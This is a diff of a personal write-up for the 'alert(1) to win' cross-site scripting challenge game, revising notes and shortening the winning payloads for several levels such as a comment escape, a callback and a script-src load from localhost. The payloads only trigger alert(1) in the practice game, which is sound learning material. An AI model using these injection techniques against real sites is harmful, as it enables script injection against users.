@@ -1,7 +1,7 @@
 This documents a bit of a journey on [alert(1) to win](https://alf.nu/alert1).
 Sometimes it seemed like it was broken. Other times it was pretty fun and worked.
 
-__NOTE:__ If, like me, you're a bit of a FireFox fanboy: It doesn't work on FF for some reason. Atleast the `Markdown` challenge definitely does not function properly (doesn't register a win), so after much hair pulling I moved onto Chrome for the rest of these.
+__NOTE:__ If, like me, you're a bit of a FireFox fanboy: It doesn't always work on FF for some reason. Atleast the `Markdown` challenge definitely does not function properly (doesn't register a win), so after much hair pulling I moved onto Chrome for these.
 
 __Done__
 - [x] Warmup
@@ -37,9 +37,9 @@ function escape(s) {
 
 ### Win with:
 ```
-");alert(1)//
+",alert(1),"
 ```
-13 characters
+12 characters
 
 
 ## Adobe
@@ -87,7 +87,7 @@ function escape(s) {
 ```
 ### comments
 This was very hard to figure out, mainly because the script didn't give me feedback and I had to manually crawl the iframe in developer tools after each attempt to see what the output code was.
-__Note__: Switching to chrome and the iframe stuff worked.
+__Note__: Switching to chrome and the iframe/console output stuff worked.
 
 So anyways, let's note that it's a url, so let's URI encode a `"`->`%22`
 
@@ -191,9 +191,9 @@ and it turns out `.createComment()` doesn't escape `-->` :upside_down_face:
 
 ### Win with:
 ```
-Comment#--><script>alert(1)</script><!--
+Comment#--><script>alert(1)</script>
 ```
-40 characters
+36 characters
 
 ## Callback
 ### filter
@@ -217,7 +217,9 @@ I feel bad for not figuring this out myself...
 
 
 ### win with:
-`'#';alert(1)//`
+```
+'#';alert(1)//
+```
 14 characters
 
 
@@ -278,17 +280,21 @@ I've seen please say `with(0) x=[].sort,x()` get's you a reference to the window
 
 In the end I didn't find a good way to get to `window`. If you know something, let me know.
 
-
+_Note_: if you want to see the full solution for this, checkout the later [Skandia II writeup](#Skandia%20%5D%5B)
 
 __another way__
 well, you could just use the fact that domains aren't case sensitive and neither is html, so you can src your script from somewhere: (I spun up something that responded with 'alert(1)' to any GET on port 80)
 `")</script><script src="http:127.0.0.1">`
 `")</script><script src="http:localhost">`
-note: you could shorten this further by messing with your local DNS resolution to get shorter urls. Alos, remove those quotes.
+note: you could shorten this further by messing with your local DNS resolution to get shorter urls. Also, remove those quotes.
 
 ### win with:
-`")</script><script src=http:localhost>`
-38 characters
+```
+</script><script src=http:localhost>
+```
+36 characters
+
+(28 characters is acheived if you modify your machine to route a 1 character domain to your script file.)
 
 
 ## Template
